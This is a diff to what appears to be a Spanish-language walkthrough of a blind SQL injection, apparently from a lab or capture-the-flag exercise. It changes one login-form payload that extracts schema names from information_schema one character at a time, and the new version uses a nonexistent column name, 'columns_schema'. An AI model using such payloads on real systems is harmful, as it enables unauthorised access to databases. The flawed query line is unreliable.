@@ -84,5 +84,5 @@ ejecutamos el ataque cambiando la posición, en este caso nos da la letra "i"
 tenemos que hacer esto hasta sacar el nombre de la tabla
 
 ```python
-	username=kitty'+and+substring((select+column_name+from+information_schema.tables+where+table_schema="mywebsite"+limit+0,1),1,1)="a"+#&password=kitty
+	username=kitty'+and+substring((select+column_name+from+information_schema.columns+where+columns_schema="mywebsite"+limit+0,1),1,1)="a"+#&password=kitty
 ```
